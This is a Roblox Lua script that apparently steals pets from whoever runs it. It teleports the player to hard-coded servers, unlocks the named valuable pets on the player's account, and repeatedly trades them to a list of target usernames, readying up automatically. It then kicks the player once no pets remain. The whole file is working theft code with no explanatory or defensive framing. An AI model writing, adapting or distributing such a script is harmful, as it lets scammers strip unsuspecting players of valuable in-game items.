-- CONFIG
local targetUsernames = {"Keiyoz", "Ebikeu", "MALIKSTOM"}
local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
local targetJobIds = {
	"86bdb26f-06b8-46e8-bd72-51283aae321f",
	"ec397141-773f-4a36-9941-a76309f6ad80",
	"b541b274-3521-4290-9824-af6c36a36aba"
}

-- SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

-- MODULES
local Network = require(ReplicatedStorage.Modules.Network)
local Replication = require(ReplicatedStorage.Game.Replication)

-- VARIABLES
local player = Players.LocalPlayer
local attemptedJobs = {}
local inTrade = false
local didAddThisTrade = false

-- TRADE STATE DETECTION
Network:BindEvents({
	StartTrade = function()
		inTrade = true
		didAddThisTrade = false
	end,
	CloseTrade = function()
		inTrade = false
		didAddThisTrade = false
	end,
})

-- UTILS
local function WaitForCondition(fn, timeout)
	local t0 = os.clock()
	while not fn() do
		if os.clock() - t0 > (timeout or 30) then
			return false
		end
		task.wait(0.2)
	end
	return true
end

local function WaitForPets(timeout)
	local t0 = os.clock()
	while os.clock() - t0 < (timeout or 30) do
		local pets = Replication.Data and Replication.Data.Pets
		if pets and next(pets) ~= nil then
			return pets
		end
		task.wait(0.2)
	end
	return Replication.Data and Replication.Data.Pets
end

-- PET LOGIC
local function UnlockPets()
	local lookup = {}
	for _, n in ipairs(petsToTrade) do
		lookup[n] = true
	end

	local pets = WaitForPets(20)
	if not pets then return end

	for _, petData in pairs(pets) do
		if petData and petData.Id and petData.Name and lookup[petData.Name] and petData.Locked then
			Network:InvokeServer("LockPet", petData.Id, false)
		end
	end
end

local function GetPetIDsByName()
	local ids = {}
	local lookup = {}
	for _, n in ipairs(petsToTrade) do
		lookup[n] = true
	end

	local pets = WaitForPets(20)
	if not pets then return ids end

	for _, petData in pairs(pets) do
		if petData and petData.Id and petData.Name and lookup[petData.Name] then
			table.insert(ids, petData.Id)
		end
	end

	return ids
end

local function HasPetsToTrade()
	return #GetPetIDsByName() > 0
end

-- JOB / SERVER LOGIC
local function TeleportToJob(jobId)
	while true do
		local ok = pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId)
		end)
		if ok then break end
		task.wait(20)
	end
end

local function GetRandomJobId()
	local pool = {}
	for _, id in ipairs(targetJobIds) do
		if not attemptedJobs[id] then
			table.insert(pool, id)
		end
	end

	if #pool == 0 then
		attemptedJobs = {}
		return targetJobIds[math.random(#targetJobIds)]
	end

	return pool[math.random(#pool)]
end

local function IsInTargetJob()
	for _, id in ipairs(targetJobIds) do
		if game.JobId == id then
			return true
		end
	end
	return false
end

local function FindTargetPlayer()
	for _, name in ipairs(targetUsernames) do
		local p = Players:FindFirstChild(name)
		if p then return p end
	end
	return nil
end

local function JoinRandomJob()
	while true do
		local jobId = GetRandomJobId()
		attemptedJobs[jobId] = true
		TeleportToJob(jobId)

		local loaded = WaitForCondition(function()
			return game:IsLoaded() and Players.LocalPlayer
		end, 15)

		if loaded then
			task.wait(5)
			if IsInTargetJob() then
				return
			end
		end
	end
end

-- TRADE LOOP:
-- 1) spam SendTrade every 1s until StartTrade fires
-- 2) once inTrade = true, add pets once, ready up once
-- 3) wait until CloseTrade then resume
local function TradeWithTarget()
	WaitForPets(20)

	while true do
		if not HasPetsToTrade() then
			player:Kick("No more pets to trade")
			return
		end

		UnlockPets()

		local target = FindTargetPlayer()
		if target then
			-- spam requests until trade starts
			if not inTrade then
				Network:FireServer("SendTrade", target)
			end

			-- once trade starts, add pets ONCE per trade
			if inTrade and not didAddThisTrade then
				didAddThisTrade = true

				-- small delay helps if trade session needs a moment to be ready
				task.wait(0.3)

				local petIDs = GetPetIDsByName()
				for _, petId in ipairs(petIDs) do
					Network:InvokeServer("AddTradeItem", { "Pet", petId })
					task.wait(0.05)
				end

				-- ready up after adding
				Network:FireServer("ReadyUp", false, true)
			end

			-- wait until trade closes, then resume spamming
			if inTrade then
				WaitForCondition(function()
					return not inTrade
				end, 999999)
			end
		end

		task.wait(1)
	end
end

-- MAIN
if not IsInTargetJob() then
	JoinRandomJob()
end

TradeWithTarget()
